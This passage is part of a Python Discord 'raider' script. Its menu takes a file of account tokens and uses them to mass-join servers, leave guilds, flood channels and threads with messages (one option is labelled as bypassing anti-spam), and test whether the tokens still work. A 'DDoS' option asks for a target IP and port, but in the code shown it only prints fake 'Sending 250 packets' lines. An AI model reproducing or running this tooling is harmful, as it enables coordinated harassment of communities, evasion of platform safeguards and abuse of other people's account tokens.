        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("dsc.gg/", "")
        tokens = open("tokens.txt", "r").read().splitlines()
        for token in tokens:
            threading.Thread(target=join, args=(invite, token)).start()
        go_back_to_menu()
    elif choice == "2":
        typingPrint("Normal Token Leaver From Guild")
        tokens = open("tokens.txt", "r").read().splitlines()
        print("")
        typingPrint(f'{Fore.RED}| {Fore.WHITE}Guild ID [>] ')
        guild_id = input()
        for token in tokens:
            threading.Thread(target=leave, args=(guild_id, token)).start()
        go_back_to_menu()
    elif choice == '3':
        typingPrint("Fastest Spammer in the raider world!")
        tokens = open("tokens.txt", "r").read().splitlines()
        print("")
        channel_id = input(f'{Fore.RED}| {Fore.WHITE} Channel ID [>] ')
        delay = input(f'{Fore.RED}| {Fore.WHITE} Delay [100-150 recommended] [>] ')
        msg = input(f'{Fore.RED}| {Fore.WHITE} Message [>] ')
        antispam = input(f'{Fore.RED}| {Fore.WHITE} Bypass AntiSpam [y/n]: ').lower()
        speed = input(f'{Fore.RED}| {Fore.WHITE} Speed Mode [y/n]: ').lower()

        if antispam == "y":
            antispam = True
        else:
            antispam = False

        if speed == "y":
            speed = True
        else:
            speed = False

        delay = int(delay) / 1000

        if channel_id == "" or msg == "":
            print(Fore.RED + "You didn't fill the input try again!")
            go_back_to_menu()
        else:
            threading.Thread(target=spam, args=(tokens, channel_id, msg, antispam, delay)).start()
            print(Fore.YELLOW + "[!] Spamming... Press 'ESC' to stop.")
            while Online:
                if keyboard.is_pressed('esc'):
                    Online = False
                time.sleep(0.1)
            go_back_to_menu()
    elif choice == "4":
        typingPrint("DDoS Kwertzyy thanks a lot guyss")
        print("")
        ip = input(f'{Fore.RED}| {Fore.WHITE} IP Target [>] ')
        port = input(f'{Fore.RED}| {Fore.WHITE} Port [>] ')
        pack = input(f'{Fore.RED}| {Fore.WHITE} Packet per second [>] ')
        thread = input(f'{Fore.RED}| {Fore.WHITE} Threads [>] ')

        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print(Fore.RED + "Sending 250 packets")
        time.sleep(0.1)
        print("")
        time.sleep(1)
        go_back_to_menu()
    elif choice == "5":
        typingPrint("Threads Spammer (You can get rate limit for 2 days by Discord Security)")
        time.sleep(3)
        tokens = open("tokens.txt", "r").read().splitlines()
        print()
        channel_id2 = input(f'{Fore.RED}| {Fore.WHITE} Channel ID: ')
        thrad_name = input(f'{Fore.RED}| {Fore.WHITE} Thread Name: ')
        msg2 = input(f'{Fore.RED}| {Fore.WHITE} Message: ')
            
        if channel_id2 == "" or msg2 == "":
                print(Fore.RED + "You didn't fill the input try again!")
                go_back_to_menu()
            
        for token in tokens:
                threading.Thread(target=thread_spammer, args=(channel_id2, msg2, thrad_name, token)).start()
                print(Fore.YELLOW + "[!] Spamming Threads... Press 'ESC' to stop.")
        while Online:
                time.sleep(2)
                if keyboard.is_pressed('esc'):
                    Online = False
                    break
                time.sleep(0.1)
        go_back_to_menu()
    elif choice == "6":
        print("Token Checker selected. Performing action...")
        print("")
        with open("tokens.txt") as f:
            for line in f:
                token = line.strip("\n")
                headers = {'Content-Type': 'application/json', 'authorization': token}
                url = "https://discordapp.com/api/v6/users/@me/library"
                r = requests.get(url, headers=headers)
                if r.status_code == 200:
                    print(f"{Fore.RED}| {Fore.WHITE} Token work! {Fore.GREEN}["+ token +"]")
                else:
                    print(f"{Fore.RED}| {Fore.WHITE} Token doesn´t work! {Fore.RED}["+ token +"]")
                time.sleep(0.2)
            go_back_to_menu()
    elif choice == 7:
        break
            
    else:
        typingPrint("Invalid choice.")
        time.sleep(3)
        os.system("cls")
    go_back_to_menu()